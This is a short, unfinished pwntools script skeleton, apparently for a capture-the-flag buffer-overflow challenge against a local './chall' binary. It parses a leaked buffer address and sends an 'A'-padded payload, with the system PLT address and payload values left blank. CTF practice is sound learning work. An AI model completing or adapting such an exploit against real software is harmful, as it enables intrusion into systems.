#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./chall")

# address
system_plt = 

_ = target.readuntil("buf1 = ") 
buf1_addr = int(target.readline(), 16)

print("buf addr : 0x{:x}".format(buf1_addr))

_ = target.readline()

# payload
payload = b"A" * 
payload += 

target.sendline(payload)

target.interactive()
